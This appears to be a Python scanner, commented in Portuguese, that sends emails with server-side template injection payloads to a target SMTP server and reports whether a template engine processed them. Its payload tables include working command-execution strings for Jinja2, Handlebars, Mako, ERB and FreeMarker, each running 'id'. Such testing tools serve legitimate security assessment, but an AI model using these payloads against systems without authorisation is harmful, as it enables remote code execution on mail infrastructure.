#!/usr/bin/env python3
"""Modulo de testes de Email Template Injection.

Testa se templates de email sao vulneraveis a injecao de codigo via
template syntax (Handlebars, Jinja2, Mako, Tornado, Go):

  - Expression Evaluation: {{7*7}}, ${7*7}, <%= 7*7 %>
  - Object Injection: {{constructor}}, {{self}}, {{globals}}
  - SSTI Payloads: payloads de Server-Side Template Injection
  - Engine Detection: identifica motor de template usado

Fluxo:
  1. Conecta ao SMTP (porta 25/587)
  2. Envia emails com payloads de template injection
  3. Analisa se o template foi processado
  4. Classifica seguranca
"""
import argparse
import contextlib
import logging
import smtplib
from dataclasses import asdict, dataclass

from utils import (
    Cyber,
    add_base_args,
    color,
    create_banner,
    init_scanner,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.emailtemplateinject")

DEFAULT_PORTS = [25, 587]

_TEMPLATE_PAYLOADS: dict[str, str] = {
    "jinja2_expr": "{{7*7}}",
    "jinja2_config": "{{config.items()}}",
    "jinja2_import": "{{''.__class__.__mro__[2].__subclasses__()}}",
    "handlebars_expr": "{{7*7}}",
    "handlebars_proto": "{{constructor.prototype}}",
    "mako_expr": "${7*7}",
    "mako_python": "<% import os %>",
    "tornado_expr": "{{7*7}}",
    "go_template": "{{7*7}}",
    "generic_expr": "${7*7}",
    "generic_percent": "%(7*7)d",
    "generic_dollar": "$((7*7))",
}

_SSTI_PROBES: dict[str, str] = {
    "jinja2_sandbox_bypass": "{{''.__class__.__mro__[1].__subclasses__()}}",
    "jinja2_os_popen": "{{lipsum.__globals__['os'].popen('id').read()}}",
    "handlebars_helper": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
    "mako_os_popen": "<% import os; x=os.popen('id').read() %>${x}",
    "tornado_os": "{{handler.settings}}",
    "erb_ssti": "<%= system('id') %>",
    "freemarker_ssti": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
}


@dataclass(frozen=True, slots=True)
class TemplateProbe:
    """Resultado de uma probe de template injection."""
    engine: str
    payload_name: str
    payload: str
    response_snippet: str
    detected: bool
    status: str  # detected, not_detected, blocked, error


@dataclass(frozen=True, slots=True)
class TemplateInjectionResult:
    """Resultado completo da verificacao de template injection."""
    target: str
    port: int
    banner: str
    engines_detected: list[str]
    probes: list[TemplateProbe]
    issues: list[str]
    overall_status: str  # vulnerable, safe, unknown


def _connect_smtp(target: str, port: int, timeout: float) -> smtplib.SMTP:
    """Conecta ao servidor SMTP em plaintext."""
    try:
        server = smtplib.SMTP(target, port, timeout=timeout)
    except smtplib.SMTPConnectError as exc:
        raise ConnectionError(f"Falha ao conectar: {exc}") from exc
    except OSError as exc:
        raise ConnectionError(f"Erro de conexao: {exc}") from exc
    return server


def _get_banner(server: smtplib.SMTP) -> str:
    """Retorna o banner EHLO do servidor."""
    try:
        _code, banner = server.ehlo()
        return banner.decode("utf-8", errors="replace") if isinstance(banner, bytes) else str(banner)
    except smtplib.SMTPException:
        return ""


def _build_email(
    from_addr: str,
    to_addr: str,
    subject: str,
    body: str,
) -> str:
    """Construi um email raw com subject e body customizados."""
    return (
        f"From: {from_addr}\r\n"
        f"To: {to_addr}\r\n"
        f"Subject: {subject}\r\n"
        f"Content-Type: text/plain; charset=utf-8\r\n"
        f"\r\n"
        f"{body}\r\n"
    )


def _send_template_email(
    server: smtplib.SMTP,
    from_addr: str,
    to_addr: str,
    payload_name: str,
    payload: str,
) -> tuple[bool, str]:
    """Envia email com payload de template injection e retorna se foi aceito."""
    subject = f"Test {payload_name}"
    body = f"Template test: {payload}\r\nValue: {payload}"

    msg = _build_email(from_addr, to_addr, subject, body)

    try:
        server.ehlo()
        server.mail(from_addr)
        server.rcpt(to_addr)
        server.data(msg)
        server.rset()
        return True, "accepted"
    except smtplib.SMTPResponseException as exc:
        return False, f"{exc.smtp_code} {exc.smtp_error}"
    except smtplib.SMTPException as exc:
        return False, str(exc)


def _detect_engine_from_response(
    response: str,
    payload_name: str,
) -> tuple[bool, str]:
    """Detecta se o template foi processado baseado na resposta."""
    response_lower = response.lower()

    patterns: dict[str, list[str]] = {
        "jinja2": ["jinja", "templateerror", "undefined", "sandbox"],
        "handlebars": ["handlebars", "mustache", "helper"],
        "mako": ["mako", "syntaxerror", "runtime"],
        "tornado": ["tornado", "template", "escape"],
        "freemarker": ["freemarker", "templateexception"],
    }

    detected_engines: list[str] = []
    for engine, keywords in patterns.items():
        for kw in keywords:
            if kw in response_lower:
                detected_engines.append(engine)

    if detected_engines:
        return True, ",".join(detected_engines)

    if "499" in response or "550" in response or "rejected" in response_lower:
        return False, "blocked"

    return False, "unknown"


def scan_email_template_injection(
    target: str,
    port: int = 587,
    from_addr: str = "test@example.com",
    to_addr: str = "test@example.com",
    timeout: float = 10.0,
) -> TemplateInjectionResult:
    """Executa a verificacao de Email Template Injection."""
    probes: list[TemplateProbe] = []
    issues: list[str] = []
    engines_detected: list[str] = []
    banner = ""

    try:
        server = _connect_smtp(target, port, timeout)
    except ConnectionError as exc:
        issues.append(f"Falha de conexao: {exc}")
        return TemplateInjectionResult(
            target=target, port=port, banner="", engines_detected=[],
            probes=[], issues=issues, overall_status="unknown",
        )

    try:
        banner = _get_banner(server)

        all_payloads = {**_TEMPLATE_PAYLOADS, **_SSTI_PROBES}

        for payload_name, payload in all_payloads.items():
            try:
                accepted, details = _send_template_email(
                    server, from_addr, to_addr, payload_name, payload,
                )

                if accepted:
                    engine_detected, engine_info = _detect_engine_from_response(
                        details, payload_name,
                    )
                    status = "detected" if engine_detected else "not_detected"

                    if engine_detected:
                        for eng in engine_info.split(","):
                            if eng and eng not in engines_detected:
                                engines_detected.append(eng)

                    probes.append(TemplateProbe(
                        engine=engine_info if engine_detected else "unknown",
                        payload_name=payload_name,
                        payload=payload[:100],
                        response_snippet=details[:200],
                        detected=engine_detected,
                        status=status,
                    ))
                else:
                    probes.append(TemplateProbe(
                        engine="unknown",
                        payload_name=payload_name,
                        payload=payload[:100],
                        response_snippet=details[:200],
                        detected=False,
                        status="blocked",
                    ))
            except (smtplib.SMTPException, OSError) as exc:
                probes.append(TemplateProbe(
                    engine="unknown",
                    payload_name=payload_name,
                    payload=payload[:100],
                    response_snippet=str(exc)[:200],
                    detected=False,
                    status="error",
                ))

    finally:
        with contextlib.suppress(smtplib.SMTPException):
            server.quit()

    detected_probes = [p for p in probes if p.detected]
    accepted_probes = [p for p in probes if p.status in ("detected", "not_detected")]

    if detected_probes:
        overall = "vulnerable"
        issues.append(f"Templates processados detectados: {', '.join(engines_detected)}")
    elif accepted_probes:
        overall = "unknown"
        issues.append("Payloads aceitos mas engines nao identificados")
    else:
        overall = "safe"
        issues.append("Todos os payloads bloqueados ou rejeitados")

    return TemplateInjectionResult(
        target=target,
        port=port,
        banner=banner[:200],
        engines_detected=engines_detected,
        probes=probes,
        issues=issues,
        overall_status=overall,
    )


def print_results(result: TemplateInjectionResult) -> None:
    """Exibe o relatorio de Email Template Injection."""
    print(color("\n[+] Email Template Injection — Relatorio:", Cyber.GREEN, Cyber.BOLD))
    print(f"  Target: {color(result.target, Cyber.WHITE, Cyber.BOLD)}:{result.port}")
    print()

    status_colors = {
        "vulnerable": (Cyber.RED, Cyber.BOLD),
        "safe": (Cyber.GREEN, Cyber.BOLD),
        "unknown": (Cyber.YELLOW, ""),
    }
    sc = status_colors.get(result.overall_status, (Cyber.WHITE, ""))
    print(f"  Status: {color(result.overall_status.upper(), *sc)}")
    print()

    if result.engines_detected:
        print(f"  Engines detectados: {color(', '.join(result.engines_detected), Cyber.CYAN, Cyber.BOLD)}")
    else:
        print(f"  Engines detectados: {color('Nenhum', Cyber.YELLOW)}")
    print()

    status_icons = {
        "detected": color("[!]", Cyber.RED, Cyber.BOLD),
        "not_detected": color("[+]", Cyber.GREEN),
        "blocked": color("[+]", Cyber.GREEN),
        "error": color("[-]", Cyber.YELLOW),
    }

    print(color("  Payloads:", Cyber.CYAN, Cyber.BOLD))
    for p in result.probes:
        icon = status_icons.get(p.status, color("[?]", Cyber.WHITE))
        print(f"    {icon} {p.payload_name}")
        if p.detected:
            print(f"      Engine: {color(p.engine, Cyber.RED)}")
            print(f"      Response: {p.response_snippet[:80]}")
        elif p.status == "blocked":
            print("      Bloqueado pelo servidor")
        print()

    if result.issues:
        print(color("  Observacoes:", Cyber.YELLOW, Cyber.BOLD))
        for issue in result.issues:
            print(f"    {color('[!]', Cyber.YELLOW)} {issue}")
        print()

    if result.overall_status == "vulnerable":
        print(color("  [-] Servidor VULNERAVEL a Email Template Injection", Cyber.RED, Cyber.BOLD))
        print(color("  [-] Remedio: sanitizar todos os inputs antes de templates", Cyber.CYAN))
    elif result.overall_status == "safe":
        print(color("  [+] Servidor seguro — templates sanitizados ou payloads bloqueados", Cyber.GREEN, Cyber.BOLD))
    else:
        print(color("  [!] Resultado inconclusivo — revisar manualmente", Cyber.YELLOW))


def banner_art() -> None:
    """Exibe o banner do Email Template Injection."""
    art = r"""
   _____ __  __ _____    _   _             ____
  |_   _|  \/  | ____|  | | | |_ __  ___  / ___| __ _ _ __ ___   ___  ___
    | | | |\/| |  _|    | | | | '_ \/ __|| |  _ / _` | '_ ` _ \ / _ \/ __|
    | | | |  | | |___   | |_| | | | \__ \| |_| | (_| | | | | | |  __/\__ \
    |_| |_|  |_|_____|   \___/|_| |_|___/ \____|\__,_|_| |_| |_|\___||___/
"""
    create_banner(art, "   template injection: testa injecao de codigo em templates de email (Handlebars, Jinja2, Mako)")()


def build_parser() -> argparse.ArgumentParser:
    """Construi o parser de argumentos da linha de comandos."""
    parser = argparse.ArgumentParser(
        description="Email Template Injection — testa injecao de codigo em templates de email.",
        epilog="Verifica se templates de email processam expressoes injetadas.",
    )
    add_base_args(parser)
    parser.add_argument("target", nargs="?", help="Host SMTP alvo (ex: mail.example.com).")
    parser.add_argument(
        "--port", "-p",
        type=int,
        default=587,
        help="Porta SMTP. Padrao: 587",
    )
    parser.add_argument(
        "--from-addr",
        default="test@example.com",
        help="Endereco FROM para os testes. Padrao: test@example.com",
    )
    parser.add_argument(
        "--to-addr",
        default="test@example.com",
        help="Endereco TO para os testes. Padrao: test@example.com",
    )
    return parser


async def _async_run_once(args: argparse.Namespace) -> int:
    """Executa um unico scan (async)."""
    quiet = init_scanner(args)

    target = getattr(args, "target", None)
    if not target:
        print(color("[!] Informe um host SMTP.", Cyber.RED))
        return 1

    if getattr(args, "dry_run", False):
        print(color("[DRY-RUN]", Cyber.YELLOW, Cyber.BOLD), "Nenhuma conexao SMTP sera feita.")
        print(color("[*]", Cyber.CYAN, Cyber.BOLD), f"Target: {color(target, Cyber.WHITE, Cyber.BOLD)}:{args.port}")
        return 0

    result = scan_email_template_injection(
        target=target,
        port=args.port,
        from_addr=args.from_addr,
        to_addr=args.to_addr,
        timeout=args.timeout,
    )

    if not quiet:
        print_results(result)

    if args.output:
        write_output(
            args.output,
            [asdict(result)],
            ["target", "port", "overall_status", "engines_detected", "issues"],
            quiet=quiet,
        )
    return 0


def run_once(args: argparse.Namespace) -> int:
    """Executa um unico scan com os argumentos fornecidos."""
    return safe_asyncio_run(_async_run_once(args))


def main() -> int:
    """Ponto de entrada principal do Email Template Injection."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(a.target),
        prompt="templeti> ",
        description="Email Template Injection — testa injecao de codigo em templates de email.",
        example="mail.example.com --port 587",
        contextual_help=(
            "Uso: <host> [opcoes]\n"
            "Exemplos:\n"
            "  mail.example.com\n"
            "  mail.example.com --port 25\n"
            "  mail.example.com --from-addr admin@test.com"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
